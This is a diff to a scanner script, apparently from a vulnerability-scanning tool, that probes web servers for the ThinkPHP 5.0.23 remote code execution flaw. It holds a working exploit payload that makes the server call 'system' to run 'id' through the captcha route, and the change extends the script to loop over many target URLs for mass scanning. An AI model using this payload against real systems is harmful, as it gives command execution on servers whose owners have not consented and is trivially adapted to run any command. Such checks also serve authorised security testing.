@@ -1,13 +1,23 @@
-#request url = var
+#request urls = array
 #define payload =/index.php?s=captcha
 #define bug = uid=
 #define info = 存在ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
 #define post = _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 function main(args)
 {
-	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],bug,0)!= "-1")
-	{
-		print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
 }
